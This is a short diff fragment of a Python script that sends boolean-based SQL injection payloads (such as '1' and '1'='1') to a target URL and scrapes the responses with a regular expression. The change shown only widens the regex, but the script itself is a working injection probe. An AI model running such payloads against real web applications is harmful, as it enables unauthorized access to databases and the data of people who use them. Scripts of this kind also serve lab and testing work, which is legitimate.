@@ -12,6 +12,6 @@ payload_list=["1","1' and '1'='1","1' and '1'='2",
 for payload in payload_list:
 	r=requests.get(base_url+payload)
 	#print(r.text)
-	regex_result=re.findall('<\/form>([\w\s\.@]*)<br/>',r.text)
+	regex_result=re.findall('<\/form>([\w\s\d\-\.@]*)<br/>',r.text)
 	regex_result=handle_regex_result(regex_result)
 	print("Payload:"+payload+" Result:",regex_result)
